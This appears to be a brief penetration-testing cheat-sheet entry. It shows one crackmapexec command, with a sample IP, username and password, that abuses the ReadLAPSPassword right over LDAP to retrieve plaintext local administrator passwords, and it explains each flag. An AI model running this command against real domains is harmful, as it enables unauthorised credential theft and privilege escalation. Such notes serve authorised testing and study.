# ReadLAPSPassword

Abuse privilige remotely:

{% code overflow="wrap" %}
```sh
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```
{% endcode %}

* `ldap`: Module to interact with LDAP.
* `-u` / `-p`: Credentials for an authenticated domain user.
* `--kdcHost`: Specify the IP of the domain controller.
* `-M laps`: Runs the LAPS enumeration module to retrieve plaintext local admin passwords if the user has permission.



\
